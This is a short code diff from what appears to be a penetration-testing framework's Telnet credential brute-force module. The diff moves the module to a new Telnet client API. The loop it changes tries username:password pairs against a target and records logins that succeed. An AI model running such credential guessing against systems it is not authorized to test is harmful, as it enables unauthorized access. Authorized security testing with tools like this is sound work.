@@ -51,19 +51,20 @@ class Exploit(TelnetClient):
         while running.is_set():
             try:
                 username, password = data.next().split(":")
-                telnet = self.telnet_login(username, password, retries=3)
-                if telnet:
+                telnet_client = self.telnet_create()
+                if telnet_client.login(username, password, retries=3):
                     if self.stop_on_success:
                         running.clear()
 
                     self.credentials.append((self.target, self.port, self.target_protocol, username, password))
-                    telnet.close()
+                    telnet_client.close()
 
             except StopIteration:
                 break
 
     def check(self):
-        if self.telnet_test_connect():
+        telnet_client = self.telnet_create()
+        if telnet_client.test_connect():
             print_status("Target exposes Telnet service", verbose=self.verbosity)
             return True
 
